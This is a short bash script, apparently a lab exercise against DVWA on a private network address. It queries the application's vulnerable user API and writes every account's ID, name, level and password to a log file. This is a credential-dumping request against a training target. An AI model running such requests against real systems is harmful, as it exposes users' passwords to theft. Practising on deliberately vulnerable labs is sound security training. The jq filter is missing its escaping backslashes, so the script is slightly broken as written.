#!/bin/bash

( echo -e "ID\tName\tLevel\tPassword"
curl -s http://192.168.56.105/DVWA/vulnerabilities/api/v1/user/ \
| jq -r '.[] | "(.id)\t(.name)\t(.level)\t(.password)"'
) > /home/kali/api_low.log
